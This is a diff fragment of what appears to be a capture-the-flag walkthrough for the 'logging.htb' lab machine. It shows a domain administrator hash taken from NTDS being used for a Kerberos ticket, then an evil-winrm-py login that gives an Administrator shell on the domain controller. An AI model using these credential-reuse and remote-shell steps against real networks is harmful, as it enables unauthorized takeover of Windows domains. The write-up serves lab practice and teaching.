@@ -934,4 +934,19 @@ SMB         10.129.245.130  445    DC01             [+] Run the following comman
 ❯❯❯ export KRB5_CONFIG=/etc/krb5.conf
 ```
 
-Then ill use the DA hash from ntds to get a valid TGT then export it, and finally setup a realm and export
+Then ill use the DA hash from ntds to get a valid TGT then export it, and finally setup a realm and export it using nxc
+
+```python
+❯❯❯ faketime -f +7h evil-winrm-py -k --no-pass -i dc01.logging.htb
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.6.0
+
+[*] Connecting to 'dc01.logging.htb:5985' as 'Administrator@LOGGING.HTB'
+evil-winrm-py PS C:\Users\Administrator\Documents>
+```
+
+Then i can auth as the domain admin after syncing with the clock
+
